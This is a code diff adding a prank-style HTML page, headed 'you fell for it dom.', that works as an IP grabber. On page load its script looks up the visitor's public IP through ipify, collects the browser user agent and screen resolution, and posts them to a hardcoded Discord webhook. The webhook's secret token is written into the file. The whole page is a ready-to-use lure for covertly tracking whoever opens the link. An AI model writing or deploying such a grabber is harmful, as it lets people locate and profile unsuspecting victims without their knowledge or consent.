@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Message to Discord Webhook</title>
+</head>
+
+<body>
+    <center>
+        <h1>you fell for it dom.</h1>
+    </center>
+
+    <script>
+        // Define your Discord webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1223441488625533028/BG-cWJMBeDcVPJBj8O_iRWblDPLhrwBHKj5rBVUZfBLVTDKY45Mpbr6wePZSMlp_n7PP";
+
+        // Function to get visitor information and send it to Discord webhook
+        function sendVisitorInfo() {
+            // Function to send HTTP request to ipify API and get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const visitorInfo = {
+                        content: "Visitor Info:\n" +
+                            "User Agent: " + navigator.userAgent + "\n" + // Get user agent information
+                            "Device Resolution: " + window.screen.width + "x" + window.screen.height + "\n" + // Get device resolution
+                            "IP Address: " + ipAddress // Get IP address
+                    };
+
+                    // Send a POST request to the Discord webhook
+                    fetch(webhookUrl, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(visitorInfo)
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error("Failed to send message to Discord webhook");
+                            }
+                            console.log("Message sent successfully to Discord webhook");
+                        })
+                        .catch(error => {
+                            console.error("Error:", error);
+                        });
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
+        }
+
+        // Call the function to send visitor information when the page loads
+        sendVisitorInfo();
+    </script>
+</body>
+
+</html>
